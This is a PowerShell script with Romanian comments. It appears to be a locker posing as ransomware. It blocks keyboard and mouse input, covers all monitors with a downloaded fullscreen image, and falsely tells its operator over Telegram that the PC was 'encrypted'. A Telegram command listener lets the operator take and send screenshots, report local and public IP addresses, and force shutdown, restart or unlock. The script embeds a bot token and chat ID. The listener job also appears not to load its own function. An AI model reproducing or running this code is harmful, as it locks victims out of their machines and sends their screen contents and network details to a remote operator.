# Variabile configurare Telegram
$botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
$chatId = "656189986"
$pc = $env:COMPUTERNAME
$user = $env:USERNAME

# Imagine
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"
Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -UseBasicParsing

# Trimitere mesaj Telegram
function Send-Telegram ($text) {
    Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
        chat_id = $chatId
        text    = $text
    }
}

# Listener Telegram stabil
function Telegram-Listener {
    $lastUpdateId = 0
    $baseUri = "https://api.telegram.org/bot$botToken"

    while ($true) {
        $updates = Invoke-RestMethod "$baseUri/getUpdates?offset=$($lastUpdateId + 1)&timeout=10"
        foreach ($update in $updates.result) {
            $lastUpdateId = $update.update_id
            $text = $update.message.text.Trim()

            switch ($text) {
                "/unlock$user" {
                    Send-Telegram "🔓 PC-ul $user ($pc) a fost deblocat."
                    [Environment]::Exit(0)
                }
                "/shutdown$user" {
                    Send-Telegram "🛑 PC-ul $user ($pc) se inchide acum."
                    Stop-Computer -Force
                }
                "/restart$user" {
                    Send-Telegram "🔄 PC-ul $user ($pc) reporneste acum."
                    Restart-Computer -Force
                }
                "/info$user" {
                    $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
                        $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80'
                    })[0].IPAddress
                    $ipPublic = (Invoke-RestMethod "https://api.ipify.org")
                    Send-Telegram "ℹ️ PC: $pc | User: $user`nIP local: $ipLocal`nIP public: $ipPublic"
                }
                "/screenshot$user" {
                    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
                    $bmp = New-Object Drawing.Bitmap ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width), ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
                    $graphics = [Drawing.Graphics]::FromImage($bmp)
                    $graphics.CopyFromScreen(0,0,0,0,$bmp.Size)
                    $screenshotPath = "$env:TEMP\screenshot.jpg"
                    $bmp.Save($screenshotPath, [Drawing.Imaging.ImageFormat]::Jpeg)

                    Invoke-RestMethod -Uri "$baseUri/sendPhoto" -Method Post -Form @{
                        chat_id = $chatId
                        photo   = [System.IO.File]::OpenRead($screenshotPath)
                    }
                }
                "❤️" {
                    Send-Telegram "❤️ Comanda globala de inchidere receptionata. Inchidere."
                    [Environment]::Exit(0)
                }
            }
        }
        Start-Sleep 1
    }
}

# Blochează tastele (Windows, Alt+Tab)
Add-Type @"
using System; using System.Runtime.InteropServices;
public class NativeMethods {
    [DllImport("user32.dll")] public static extern bool BlockInput(bool block);
}
"@
[NativeMethods]::BlockInput($true)

# Afișare fullscreen pe toate monitoarele
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
    $form = New-Object System.Windows.Forms.Form -Property @{
        WindowState='Maximized'
        FormBorderStyle='None'
        TopMost=$true
        Location=$screen.Bounds.Location
        Size=$screen.Bounds.Size
        BackColor='Black'
        Cursor=[System.Windows.Forms.Cursors]::None
    }

    $pb = New-Object Windows.Forms.PictureBox -Property @{
        Dock='Fill'
        Image=[Drawing.Image]::FromFile($tempImagePath)
        SizeMode='StretchImage'
    }
    $form.Controls.Add($pb)
    $form.Show()
    $form
}

# Trimite mesaj inițial clar cu comenzi
$msg = @"
✅ PC-ul $user ($pc) a fost criptat cu succes!

🔓 /unlock$user
🛑 /shutdown$user
🔄 /restart$user
📸 /screenshot$user
ℹ️ /info$user
"@
Send-Telegram $msg

# Start ascultare Telegram
Start-Job -ScriptBlock { Telegram-Listener }

# Rulează aplicația
[System.Windows.Forms.Application]::Run()

# Deblocare input la finalizare
[NativeMethods]::BlockInput($false)
